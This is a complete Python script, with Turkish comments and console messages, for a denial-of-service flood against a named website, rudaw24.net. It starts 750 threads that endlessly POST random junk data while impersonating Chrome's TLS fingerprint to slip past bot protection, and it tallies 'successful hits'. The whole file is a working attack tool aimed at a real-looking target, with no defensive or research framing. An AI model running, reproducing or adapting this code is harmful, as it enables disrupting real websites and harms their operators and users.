from curl_cffi import requests
import threading
import random
import time
import sys

# --- OPERASYONEL AYARLAR ---
TARGET_URL = 'https://rudaw24.net/' 
WORKER_COUNT = 750
# ----------------------------

# --- RENK KODLARI (Terminali daha okunur yapmak için) ---
class bcolors:
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

request_counter = 0
failure_counter = 0
counter_lock = threading.Lock()

def launch_piercer():
    global request_counter, failure_counter
    
    session = requests.Session()
    
    while True:
        try:
            junk_data = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for i in range(512))
            response = session.post(
                TARGET_URL,
                impersonate="chrome110",
                data={'data': junk_data},
                timeout=15
            )
            response.raise_for_status() # 2xx dışındaki durum kodları için hata fırlat

            # --- BAŞARILI İSTEK RAPORU ---
            with counter_lock:
                request_counter += 1
                # Her başarılı istekte konsolu güncelle
                print(f"\r{bcolors.OKGREEN}[+] Başarılı Darbe: {request_counter} | Başarısız: {failure_counter} | Son Durum: {response.status_code}{bcolors.ENDC}", end="", flush=True)

        except Exception as e:
            # --- BAŞARISIZ İSTEK RAPORU ---
            with counter_lock:
                failure_counter += 1
                # Her başarısız istekte yeni bir satıra hata yazdır
                print(f"\n{bcolors.FAIL}[-] Temas Kurulamadı! (Hata: {e.__class__.__name__}){bcolors.ENDC}")
            time.sleep(2) # Başarısız olunca daha uzun bekle

if __name__ == "__main__":
    if not TARGET_URL:
        print("HATA: Lütfen script içindeki TARGET_URL değişkenini ayarlayın.")
        sys.exit(1)
        
    print("=====================================================")
    print("  MODIE: 'Zırh Delici' v1.2 (Canlı Raporlama) Aktif  ")
    print("=====================================================")
    print(f"Hedef: {TARGET_URL}") 
    print(f"Worker Sayısı: {WORKER_COUNT}")
    print("Saldırı başlatılıyor... Anlık raporlama devrede.")
    print("=====================================================")

    threads = []
    for i in range(WORKER_COUNT):
        thread = threading.Thread(target=launch_piercer, daemon=True)
        threads.append(thread)
        thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Operasyon kullanıcı tarafından durduruldu.")
        sys.exit(0)
